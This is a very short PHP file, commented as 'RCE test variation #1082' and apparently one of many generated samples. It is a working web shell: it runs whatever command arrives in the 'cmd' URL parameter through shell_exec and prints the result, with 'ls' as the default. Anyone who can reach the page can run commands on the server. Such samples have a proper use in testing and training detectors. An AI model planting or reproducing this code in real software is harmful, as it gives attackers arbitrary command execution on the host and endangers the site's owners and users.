<?php
// RCE test variation #1082
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>